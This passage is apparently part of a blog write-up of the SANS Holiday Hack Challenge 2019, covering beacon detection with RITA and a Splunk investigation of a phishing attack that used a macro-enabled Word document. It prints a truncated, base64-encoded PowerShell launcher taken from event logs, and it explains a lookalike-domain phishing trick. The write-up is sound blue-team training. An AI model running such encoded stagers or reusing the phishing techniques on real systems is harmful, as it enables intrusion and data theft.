&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;PS /home/elf&amp;gt; (Invoke-WebRequest http://127.0.0.1:1225/api/output).RawContent&lt;/span&gt;
&lt;span class="go"&gt;HTTP/1.0 200 OK&lt;/span&gt;
&lt;span class="go"&gt;Server: Werkzeug/0.16.0&lt;/span&gt;
&lt;span class="go"&gt;Server: Python/3.6.9&lt;/span&gt;
&lt;span class="go"&gt;Date: Mon, 30 Dec 2019 12:39:57 GMT&lt;/span&gt;
&lt;span class="go"&gt;Content-Type: text/html; charset=utf-8&lt;/span&gt;
&lt;span class="go"&gt;Content-Length: 58&lt;/span&gt;

&lt;span class="go"&gt;Failure - Only 2.17 Mega-Jollies of Laser Output Reached!&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;It didn't work! Hmm, maybe we should try &lt;a class="reference external" href="https://www.youtube.com/watch?v=p85xwZ_OLX0"&gt;turning it off and on again?&lt;/a&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="go"&gt;PS /home/elf&amp;gt; (Invoke-WebRequest http://127.0.0.1:1225/api/off).RawContent&lt;/span&gt;
&lt;span class="go"&gt;HTTP/1.0 200 OK&lt;/span&gt;
&lt;span class="go"&gt;Server: Werkzeug/0.16.0&lt;/span&gt;
&lt;span class="go"&gt;Server: Python/3.6.9&lt;/span&gt;
&lt;span class="go"&gt;Date: Mon, 30 Dec 2019 12:40:12 GMT&lt;/span&gt;
&lt;span class="go"&gt;Content-Type: text/html; charset=utf-8&lt;/span&gt;
&lt;span class="go"&gt;Content-Length: 33&lt;/span&gt;

&lt;span class="go"&gt;Christmas Cheer Laser Powered Off&lt;/span&gt;
&lt;span class="go"&gt;PS /home/elf&amp;gt; (Invoke-WebRequest http://127.0.0.1:1225/api/on).RawContent&lt;/span&gt;
&lt;span class="go"&gt;HTTP/1.0 200 OK&lt;/span&gt;
&lt;span class="go"&gt;Server: Werkzeug/0.16.0&lt;/span&gt;
&lt;span class="go"&gt;Server: Python/3.6.9&lt;/span&gt;
&lt;span class="go"&gt;Date: Mon, 30 Dec 2019 12:40:18 GMT&lt;/span&gt;
&lt;span class="go"&gt;Content-Type: text/html; charset=utf-8&lt;/span&gt;
&lt;span class="go"&gt;Content-Length: 32&lt;/span&gt;

&lt;span class="go"&gt;Christmas Cheer Laser Powered On&lt;/span&gt;
&lt;span class="go"&gt;PS /home/elf&amp;gt; (Invoke-WebRequest http://127.0.0.1:1225/api/output).RawContent&lt;/span&gt;
&lt;span class="go"&gt;HTTP/1.0 200 OK&lt;/span&gt;
&lt;span class="go"&gt;Server: Werkzeug/0.16.0&lt;/span&gt;
&lt;span class="go"&gt;Server: Python/3.6.9&lt;/span&gt;
&lt;span class="go"&gt;Date: Mon, 30 Dec 2019 12:40:21 GMT&lt;/span&gt;
&lt;span class="go"&gt;Content-Type: text/html; charset=utf-8&lt;/span&gt;
&lt;span class="go"&gt;Content-Length: 200&lt;/span&gt;

&lt;span class="go"&gt;Success! - 5.47 Mega-Jollies of Laser Output Reached!&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;There you go!&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="network-log-analysis-determine-compromised-system"&gt;
&lt;h3&gt;&lt;a class="toc-backref" href="#id13"&gt;Network Log Analysis: Determine Compromised System&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;We're given &lt;a class="reference external" href="https://downloads.elfu.org/elfu-zeeklogs.zip"&gt;Zeek logs&lt;/a&gt; to try
and identify the IP address of the infected computer. Among the log files,
we can see some HTML files. Let's open them in our browser:&lt;/p&gt;
&lt;img alt="rita_index.png" class="align-center" src="/images/sans-christmas-challenge-2019/rita_index.png" /&gt;
&lt;p&gt;We have the web interface to &lt;a class="reference external" href="https://github.com/activecm/rita"&gt;RITA&lt;/a&gt;, the
Real Intelligence Threat Analytics tool. It can ingest Bro or Zeek logs, and
detect several suspicious behaviour on the network, including &lt;strong&gt;beaconing
behaviour&lt;/strong&gt;. This means that it can likely help us identify the machine that
was infected, and is likely taking order from a &lt;a class="reference external" href="https://en.wikipedia.org/wiki/Botnet#Command_and_control"&gt;C2 server&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Let's go over the &amp;quot;Beacons&amp;quot; tab:&lt;/p&gt;
&lt;img alt="rita_beacons.png" class="align-center" src="/images/sans-christmas-challenge-2019/rita_beacons.png" /&gt;
&lt;p&gt;By far, the most suspicious activity seems to be between internal IP
&lt;code&gt;192.168.134.130&lt;/code&gt; and external IP &lt;code&gt;144.202.46.214&lt;/code&gt;. This means that
the infected machine is likely &lt;code&gt;192.168.134.130&lt;/code&gt;.&lt;/p&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div class="section" id="objective-6-splunk"&gt;
&lt;h2&gt;&lt;a class="toc-backref" href="#id14"&gt;Objective 6: Splunk&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;Now that we have solved objectives 2 through 5, let's go talk to Santa again.&lt;/p&gt;
&lt;img alt="santa_squad.png" class="align-center" src="/images/sans-christmas-challenge-2019/santa_squad.png" /&gt;
&lt;p&gt;&lt;em&gt;Santa says&lt;/em&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Thank you for finding &lt;a class="reference external" href="https://disney.fandom.com/wiki/Jane_Banks"&gt;Jane&lt;/a&gt;
and &lt;a class="reference external" href="https://disney.fandom.com/wiki/Michael_Banks"&gt;Michael&lt;/a&gt;, our two
turtle doves!&lt;/p&gt;
&lt;p&gt;I’ve got an uneasy feeling about how they disappeared.&lt;/p&gt;
&lt;p&gt;Turtle doves wouldn’t wander off like that.&lt;/p&gt;
&lt;p&gt;Someone must have stolen them! Please help us find the thief!&lt;/p&gt;
&lt;p&gt;It’s a moral imperative!&lt;/p&gt;
&lt;p&gt;I think you should look for an entrance to the steam tunnels and solve Challenge 6 and 7 too!&lt;/p&gt;
&lt;p&gt;Gosh, I can’t help but think:&lt;/p&gt;
&lt;p&gt;Winds in the East, snow coming in…&lt;/p&gt;
&lt;p&gt;Like something is brewing and about to begin!&lt;/p&gt;
&lt;p&gt;Can’t put my finger on what lies in store,&lt;/p&gt;
&lt;p&gt;&lt;a class="reference external" href="https://www.youtube.com/watch?v=SSfGBskfthg"&gt;But I fear what’s to happen all happened before!&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;We're asked to contact the Elf U SOC team via their &lt;a class="reference external" href="https://splunk.elfu.org/"&gt;Splunk server&lt;/a&gt;
(credentials &lt;code&gt;elf:elfsocks&lt;/code&gt;).&lt;/p&gt;
&lt;p&gt;We first have a little chat with Kent:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Guest (me):&lt;/strong&gt; Hi Kent :-)&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Kent:&lt;/strong&gt; Hi yourself.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Guest (me):&lt;/strong&gt; I ran into Professor Banas. He said you contacted him about
his computer being hacked?&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Kent:&lt;/strong&gt; Oh, well lots of analysts try to make it here in the ELF U SOC,
but most of them crack under the pressure&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Guest (me):&lt;/strong&gt; Well, can I help?&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Kent:&lt;/strong&gt; You can try. Go check out #ELFU SOC. Maybe someone there will
have time to bring you up to speed. Here's a tip, click on those blinking
red dots to the left column and read very carefully.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Guest (me):&lt;/strong&gt; Thanks???&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Alright, Kent... Way to be an ass. Anyway, let's check the #ELFU SOC channel:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Cosmo Jingleberg:&lt;/strong&gt; Hey did you all see that beaconing detection from
RITA?&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Zippy Frostington:&lt;/strong&gt; Yep. And we have some system called 'sweetums' here
on campus communicating with the same weird IP&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Alice Bluebird:&lt;/strong&gt; Gah... that's Professor Banas' system from over in the
Polar Studies department&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Guest (me):&lt;/strong&gt; That's why I'm here, actually...Kent sent me to this
channel to help with Prof. Banas' system&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Alice Bluebird:&lt;/strong&gt; smh...I'll DM you&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;And in DM with Alice:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Alice Bluebird:&lt;/strong&gt; Okay. Your goal is to find the message for Kent that
the adversary embedded in this attack.&lt;/p&gt;
&lt;p&gt;If you think you have the chops for that, don't let me slow you down. Get
searching and enter the Challenge Question answer when you've found it.&lt;/p&gt;
&lt;p&gt;You'll need to know some things, though:&lt;/p&gt;
&lt;blockquote&gt;
&lt;ul class="simple"&gt;
&lt;li&gt;We use Splunk, so click &lt;a class="reference external" href="https://splunk.elfu.org/en-US/app/SA-elfusoc/search"&gt;here&lt;/a&gt;
or hit the Search link in the navigation up above to get started.&lt;/li&gt;
&lt;li&gt;I copied some raw files &lt;a class="reference external" href="http://elfu-soc.s3-website-us-east-1.amazonaws.com/"&gt;here&lt;/a&gt;
or click the File Archive link in the navigation. (You'll find some
references to the File Archive contents in Splunk)&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;You'll need to use both of these resources to answer the Challenge
Question!&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Don't worry though, I can get you started down the right path with a few
hints if you need 'em. All you have to do is answer the first training
question. If you've read all the chat windows here, you already have the
answer ;-)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;div class="section" id="answering-the-challenge-question"&gt;
&lt;h3&gt;&lt;a class="toc-backref" href="#id15"&gt;Answering the challenge question&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;Alright, we're supposed to find the message the attacker left for Kent. Alice
says that we need both the Splunk search tool and the raw file archive to
answer this question. However, just using the file archive is possible.&lt;/p&gt;
&lt;p&gt;By taking a look at the &lt;a class="reference external" href="http://elfu-soc.s3-website-us-east-1.amazonaws.com/"&gt;file archive&lt;/a&gt;
URL, we can see that it's hosted on an AWS S3 bucket. Browsing the web
interface is not super practical, so let's download the bucket using the &lt;a class="reference external" href="https://aws.amazon.com/cli/"&gt;AWS
CLI&lt;/a&gt; tools:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; aws s3 sync s3://elfu-soc . --no-sign-request --region us-east-1
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The &lt;code&gt;--no-sign-request&lt;/code&gt; flag is used to tell the tool that we don't
want to try to authenticate: we want to download the S3 content as an
anonymous user.&lt;/p&gt;
&lt;p&gt;We can now search the raw files for mentions of Kent:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; &lt;span class="nb"&gt;cd&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;stoQ  Artifacts&amp;quot;&lt;/span&gt;
&lt;span class="gp"&gt;$&lt;/span&gt; grep -Rn &lt;span class="s1"&gt;&amp;#39;Kent&amp;#39;&lt;/span&gt; .
&lt;span class="go"&gt;./home/ubuntu/archive/f/f/1/e/a/ff1ea6f13be3faabd0da728f514deb7fe3577cc4:2:&amp;lt;cp:coreProperties xmlns:cp=&amp;quot;http://schemas.openxmlformats.org/package/2006/metadata/core-properties&amp;quot; xmlns:dc=&amp;quot;http://purl.org/dc/elements/1.1/&amp;quot; xmlns:dcterms=&amp;quot;http://purl.org/dc/terms/&amp;quot; xmlns:dcmitype=&amp;quot;http://purl.org/dc/dcmitype/&amp;quot; xmlns:xsi=&amp;quot;http://www.w3.org/2001/XMLSchema-instance&amp;quot;&amp;gt;&amp;lt;dc:title&amp;gt;Holiday Cheer Assignment&amp;lt;/dc:title&amp;gt;&amp;lt;dc:subject&amp;gt;19th Century Cheer&amp;lt;/dc:subject&amp;gt;&amp;lt;dc:creator&amp;gt;Bradly Buttercups&amp;lt;/dc:creator&amp;gt;&amp;lt;cp:keywords&amp;gt;&amp;lt;/cp:keywords&amp;gt;&amp;lt;dc:description&amp;gt;Kent you are so unfair. And we were going to make you the king of the Winter Carnival.&amp;lt;/dc:description&amp;gt;&amp;lt;cp:lastModifiedBy&amp;gt;Tim Edwards&amp;lt;/cp:lastModifiedBy&amp;gt;&amp;lt;cp:revision&amp;gt;4&amp;lt;/cp:revision&amp;gt;&amp;lt;dcterms:created xsi:type=&amp;quot;dcterms:W3CDTF&amp;quot;&amp;gt;2019-11-19T14:54:00Z&amp;lt;/dcterms:created&amp;gt;&amp;lt;dcterms:modified xsi:type=&amp;quot;dcterms:W3CDTF&amp;quot;&amp;gt;2019-11-19T17:50:00Z&amp;lt;/dcterms:modified&amp;gt;&amp;lt;cp:category&amp;gt;&amp;lt;/cp:category&amp;gt;&amp;lt;/cp:coreProperties&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The message is &lt;code&gt;Kent you are so unfair. And we were going to make you the
king of the Winter Carnival.&lt;/code&gt;. We got the correct answer, and we didn't need to
use Splunk!&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="answering-the-training-questions"&gt;
&lt;h3&gt;&lt;a class="toc-backref" href="#id16"&gt;Answering the training questions&lt;/a&gt;&lt;/h3&gt;
&lt;p&gt;However, the SANS Challenges are about learning new skills. Being on the red
side of infosec, I don't often see how the blue team operates. So I thought it
would be fun to try and learn how to search for an attacker using Splunk.&lt;/p&gt;
&lt;p&gt;So let's answer the training questions!&lt;/p&gt;
&lt;div class="section" id="first-question"&gt;
&lt;h4&gt;&lt;a class="toc-backref" href="#id17"&gt;First question&lt;/a&gt;&lt;/h4&gt;
&lt;ol class="arabic simple"&gt;
&lt;li&gt;What is the short host name of Professor Banas' computer?&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;This one is easy, we can find the info in the #ELFU SOC chan: &lt;code&gt;sweetums&lt;/code&gt;.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="second-question"&gt;
&lt;h4&gt;&lt;a class="toc-backref" href="#id18"&gt;Second question&lt;/a&gt;&lt;/h4&gt;
&lt;ol class="arabic simple" start="2"&gt;
&lt;li&gt;What is the name of the sensitive file that was likely accessed and copied
by the attacker? Please provide the fully qualified location of the file.
(Example: C:tempreport.pdf)&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;By DM, Alice tells us that the Elf U staff is worried that the attacker may
have accessed Santa's sensitive data. So let's search for &lt;code&gt;santa&lt;/code&gt; in
the &lt;a class="reference external" href="https://splunk.elfu.org/en-US/app/SA-elfusoc/search?q=search%20index%3Dmain%20santa&amp;amp;display.page.search.mode=smart&amp;amp;dispatch.sample_ratio=1&amp;amp;earliest=0&amp;amp;latest=now&amp;amp;display.general.type=events&amp;amp;display.page.search.tab=events&amp;amp;sid=1577722638.3279"&gt;Splunk search engine&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;The very first result is a suspiciously long PowerShell command accesses a file
likely sent by Santa to Professor Banas:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;08/25/2019 09:19:20 AM
LogName=Microsoft-Windows-PowerShell/Operational
SourceName=Microsoft-Windows-PowerShell
EventCode=4103
EventType=4
Type=Information
ComputerName=sweetums.elfu.org
User=NOT_TRANSLATED
Sid=S-1-5-21-1217370868-2414566453-2573080502-1004
SidType=0
TaskCategory=Executing Pipeline
OpCode=To be used when operation is just executing a method
RecordNumber=417616
Keywords=None
Message=CommandInvocation(Stop-AgentJob): &amp;quot;Stop-AgentJob&amp;quot;
CommandInvocation(Format-List): &amp;quot;Format-List&amp;quot;
CommandInvocation(Out-String): &amp;quot;Out-String&amp;quot;
ParameterBinding(Stop-AgentJob): name=&amp;quot;JobName&amp;quot;; value=&amp;quot;4VCUDA&amp;quot;
&lt;span class="hll"&gt;ParameterBinding(Format-List): name=&amp;quot;InputObject&amp;quot;; value=&amp;quot;C:\Users\cbanas\Documents\Naughty_and_Nice_2019_draft.txt:1:Carl, you know there&amp;#39;s no one I trust more than you to help.  Can you have a look at this draft Naughty and Nice list for 2019 and let me know your thoughts? -Santa&amp;quot;
&lt;/span&gt;ParameterBinding(Out-String): name=&amp;quot;InputObject&amp;quot;; value=&amp;quot;Microsoft.PowerShell.Commands.Internal.Format.FormatStartData&amp;quot;
ParameterBinding(Out-String): name=&amp;quot;InputObject&amp;quot;; value=&amp;quot;Microsoft.PowerShell.Commands.Internal.Format.GroupStartData&amp;quot;
ParameterBinding(Out-String): name=&amp;quot;InputObject&amp;quot;; value=&amp;quot;Microsoft.PowerShell.Commands.Internal.Format.FormatEntryData&amp;quot;
ParameterBinding(Out-String): name=&amp;quot;InputObject&amp;quot;; value=&amp;quot;Microsoft.PowerShell.Commands.Internal.Format.GroupEndData&amp;quot;
ParameterBinding(Out-String): name=&amp;quot;InputObject&amp;quot;; value=&amp;quot;Microsoft.PowerShell.Commands.Internal.Format.FormatEndData&amp;quot;


Context:
        Severity = Informational
        Host Name = ConsoleHost
        Host Version = 5.1.17134.858
        Host ID = c44dfd99-a4ba-452c-bf0d-07206a97112b
        Host Application = powershell -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAHIAUwBpAG8ATgBUAGEAQgBMAGUALgBQAFMAVgBFAFIAcwBJAE8AbgAuAE0AQQBKAG8AcgAgAC0AZwBFACAAMwApAHsAJABHAFAARgA9AFsAUgBlAGYAXQAuAEEAUwBzAEUATQBCAGwAeQAuAEcARQBUAFQAeQBQAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAEUAdABGAGkARQBgAEwAZAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApADsASQBGACgA
        [...]
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The file that was accessed is &lt;code&gt;C:\Users\cbanas\Documents\Naughty_and_Nice_2019_draft.txt&lt;/code&gt;.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="third-question"&gt;
&lt;h4&gt;&lt;a class="toc-backref" href="#id19"&gt;Third question&lt;/a&gt;&lt;/h4&gt;
&lt;ol class="arabic simple" start="3"&gt;
&lt;li&gt;What is the fully-qualified domain name(FQDN) of the command and control(C2)
server? (Example: badguy.baddies.com)&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;So, we know that the malware is likely using PowerShell. So let's search for
&lt;code&gt;powershell.exe&lt;/code&gt; in the &lt;a class="reference external" href="https://splunk.elfu.org/en-US/app/SA-elfusoc/search?q=search%20index%3Dmain%20powershell.exe&amp;amp;display.page.search.mode=smart&amp;amp;dispatch.sample_ratio=1&amp;amp;earliest=0&amp;amp;latest=now&amp;amp;display.general.type=events&amp;amp;display.page.search.tab=events&amp;amp;sid=1577723101.3323"&gt;Splunk search engine&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;By looking at the different fields on the side, we can see one named
&lt;code&gt;DestinationHostname&lt;/code&gt;, which is prety self-explanatory: it's likely the
hostnames that our PowerShell processes are communicating with:&lt;/p&gt;
&lt;img alt="splunk_powershell_destination_hostname.png" class="align-center" src="/images/sans-christmas-challenge-2019/splunk_powershell_destination_hostname.png" /&gt;
&lt;p&gt;We can see that around 92% of every events concerning &lt;code&gt;powershell.exe&lt;/code&gt;
are communicating with the hostname &lt;code&gt;144.202.46.214.vultr.com&lt;/code&gt;. This is
most likely our C2 FQDN.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="fourth-question"&gt;
&lt;h4&gt;&lt;a class="toc-backref" href="#id20"&gt;Fourth question&lt;/a&gt;&lt;/h4&gt;
&lt;ol class="arabic simple" start="4"&gt;
&lt;li&gt;What document is involved with launching the malicious PowerShell code?
Please provide just the filename. (Example: results.txt)&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Now, by taking a look at the different logs, we can see that Prof. Cabanas has
received a lot of emails by students, sending their assignments as attachments.
The most likely compromise path probably involves a malicious Microsoft Office
document with embedded macros that ran the malicious PowerShell code.&lt;/p&gt;
&lt;p&gt;Let's search for the Microsoft Word process &lt;code&gt;WINWORD.EXE&lt;/code&gt; in the &lt;a class="reference external" href="https://splunk.elfu.org/en-US/app/SA-elfusoc/search?q=search%20winword.exe&amp;amp;sid=1577783349.64&amp;amp;display.page.search.mode=verbose&amp;amp;dispatch.sample_ratio=1&amp;amp;earliest=0&amp;amp;latest=now"&gt;Splunk
search engine&lt;/a&gt;.
By taking a look at the &lt;code&gt;RuleName&lt;/code&gt; attributes, we can see that one
Microsoft Word process triggered a rule called &amp;quot;Execution - Suspicious WMI
module load&amp;quot;. This can indicate the execution of a macro in a Word document:&lt;/p&gt;
&lt;img alt="splunk_winword_rule.png" class="align-center" src="/images/sans-christmas-challenge-2019/splunk_winword_rule.png" /&gt;
&lt;p&gt;Let's investigate &lt;a class="reference external" href="https://splunk.elfu.org/en-US/app/SA-elfusoc/search?q=search%20winword.exe%20RuleName%3D%22Execution%20-%20Suspicious%20WMI%20module%20load%22&amp;amp;display.page.search.mode=verbose&amp;amp;dispatch.sample_ratio=1&amp;amp;earliest=0&amp;amp;latest=now&amp;amp;sid=1577783465.72"&gt;this particular&lt;/a&gt;
&lt;code&gt;WINWORD.EXE&lt;/code&gt; process. We can see from the Splunk search engine that it
was run at around 5:18 PM on 2019-08-25. This Microsoft Word process had a PID
of 6268.&lt;/p&gt;
&lt;img alt="splunk_winword_pid.png" class="align-center" src="/images/sans-christmas-challenge-2019/splunk_winword_pid.png" /&gt;
&lt;p&gt;Let's search only for this PID in the &lt;a class="reference external" href="https://splunk.elfu.org/en-US/app/SA-elfusoc/search?q=search%20process_id%3D6268&amp;amp;display.page.search.mode=verbose&amp;amp;dispatch.sample_ratio=1&amp;amp;earliest=0&amp;amp;latest=now&amp;amp;sid=1577783848A"&gt;Splunk search engine&lt;/a&gt;.&lt;/p&gt;
&lt;img alt="splunk_winword_file_path.png" class="align-center" src="/images/sans-christmas-challenge-2019/splunk_winword_file_path.png" /&gt;
&lt;p&gt;We can see in the &lt;code&gt;file_path&lt;/code&gt; attribute that this process opened a
document called &lt;code&gt;C:\Users\cbanas\AppData\Local\Packages\oice_16_974fa576_32c1d314_3570\AC\Temp\26251897.docm&lt;/code&gt;.
This looks like a good candidate. Indeded, &lt;code&gt;.docm&lt;/code&gt; documents are Office
Documents that can execute macros. However, &lt;code&gt;26251897.docm&lt;/code&gt;, is not the
original name of this document.&lt;/p&gt;
&lt;p&gt;We can see that it's in Prof Banas' temporary folder, with a temporary name.
This often happens if the file was directly open from the Internet, or from an
archive without first decompressing it to disk.&lt;/p&gt;
&lt;p&gt;We know the Microsoft Word process responsible for executing the PowerShell
payload was launched at around 5:18 Pm on 2019-08-25. Let's look for &lt;a class="reference external" href="https://splunk.elfu.org/en-US/app/SA-elfusoc/search?q=search%20mail&amp;amp;display.page.search.mode=verbose&amp;amp;dispatch.sample_ratio=1&amp;amp;earliest=1566753300&amp;amp;latest=1566753600&amp;amp;sid=1577783990.89"&gt;emails
received around that time&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;We can see that only one email was received around that time:&lt;/p&gt;
&lt;img alt="splunk_email.png" class="align-center" src="/images/sans-christmas-challenge-2019/splunk_email.png" /&gt;
&lt;p&gt;It had, indeed, a ZIP archive as an attachment, containing a document called
&lt;code&gt;19th Century Holiday Cheer Assignment.docm&lt;/code&gt;.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="fifth-question"&gt;
&lt;h4&gt;&lt;a class="toc-backref" href="#id21"&gt;Fifth question&lt;/a&gt;&lt;/h4&gt;
&lt;ol class="arabic simple" start="5"&gt;
&lt;li&gt;How many unique email addresses were used to send Holiday Cheer essays to
Professor Banas? Please provide the numeric value. (Example: 1)&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Now that is a question I find more easily answered using the &lt;a class="reference external" href="http://elfu-soc.s3-website-us-east-1.amazonaws.com/"&gt;file archive&lt;/a&gt;. We can &lt;code&gt;grep&lt;/code&gt;
for &lt;code&gt;From:&lt;/code&gt; header directly in the files:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; grep -hR &lt;span class="s1"&gt;&amp;#39;From: &amp;#39;&lt;/span&gt; .
&lt;span class="go"&gt;From: Merry Fairybubbles &amp;lt;Merry.Fairybubbles@students.elfu.org&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;From: Carl Banas &amp;lt;Carl.Banas@faculty.elfu.org&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;From: Sixpence Snowcane &amp;lt;Sixpence.Snowcane@students.elfu.org&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;From: Sparkle Redberry &amp;lt;Sparkle.Redberry@students.elfu.org&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;From: Partridge Sugartree &amp;lt;Partridge.Sugartree@students.elfu.org&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;From: Turtledove Fairytree &amp;lt;Turtledove.Fairytree@students.elfu.org&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;From: Cherry Brandyfluff &amp;lt;Cherry.Brandyfluff@students.elfu.org&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;From: Carl Banas &amp;lt;Carl.Banas@faculty.elfu.org&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;From: Cupcake Silverlog &amp;lt;Cupcake.Silverlog@students.elfu.org&amp;gt;&lt;/span&gt;
&lt;span class="go"&gt;[...]&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Let's remove Prof Banas' email address from the results, and let's get only
unique outputs:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt; grep -hR &lt;span class="s1"&gt;&amp;#39;From: &amp;#39;&lt;/span&gt; . &lt;span class="p"&gt;|&lt;/span&gt; sort -u &lt;span class="p"&gt;|&lt;/span&gt; grep -v &lt;span class="s1"&gt;&amp;#39;Carl Banas&amp;#39;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; wc -l
&lt;span class="go"&gt;21&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Twenty-one unique email addresses were used to send essays to Prof Banas.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="sixth-question"&gt;
&lt;h4&gt;&lt;a class="toc-backref" href="#id22"&gt;Sixth question&lt;/a&gt;&lt;/h4&gt;
&lt;ol class="arabic simple" start="6"&gt;
&lt;li&gt;What was the password for the zip archive that contained the suspicious
file?&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;In question four, we were able to find the malicious mail containing the
archive. Let's take a look &lt;a class="reference external" href="https://splunk.elfu.org/en-US/app/SA-elfusoc/search?q=search%20mail&amp;amp;display.page.search.mode=verbose&amp;amp;dispatch.sample_ratio=1&amp;amp;earliest=1566753300&amp;amp;latest=1566753600&amp;amp;sid=1577783990.89#"&gt;at this email&lt;/a&gt; one more time. We can see in the
&lt;code&gt;results{}.workers.smtp.body&lt;/code&gt; property the content of the email:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;professor banas, i have completed my assignment. please open the attached
zip file with password 123456789 and then open the word document to view
it. you will have to click &amp;quot;enable editing&amp;quot; then &amp;quot;enable content&amp;quot; to see
it. this was a fun assignment. i hope you like it!&lt;/p&gt;
&lt;p class="attribution"&gt;&amp;mdash;bradly buttercups&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;The password for the file is &lt;code&gt;123456789&lt;/code&gt;.&lt;/p&gt;
&lt;/div&gt;
&lt;div class="section" id="seventh-question"&gt;
&lt;h4&gt;&lt;a class="toc-backref" href="#id23"&gt;Seventh question&lt;/a&gt;&lt;/h4&gt;
&lt;ol class="arabic simple" start="7"&gt;
&lt;li&gt;What email address did the suspicious file come from?&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;From the same email, we can find the sender's email address. It's
&lt;code&gt;bradly.buttercups&amp;#64;eIfu.org&amp;gt;&lt;/code&gt;. You can notice that the second letter in
the domain is a capital &lt;code&gt;i&lt;/code&gt; and not a lowercase &lt;code&gt;l&lt;/code&gt;. It's a common
trick used when sending a phishing email.&lt;/p&gt;
&lt;p&gt;Now let's mock Kent:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Guest (me):&lt;/strong&gt; Oh man that's pretty embarrassing, eh?&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Kent:&lt;/strong&gt; Oh you again?&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Guest (me):&lt;/strong&gt; lulz...&lt;/p&gt;
&lt;blockquote&gt;
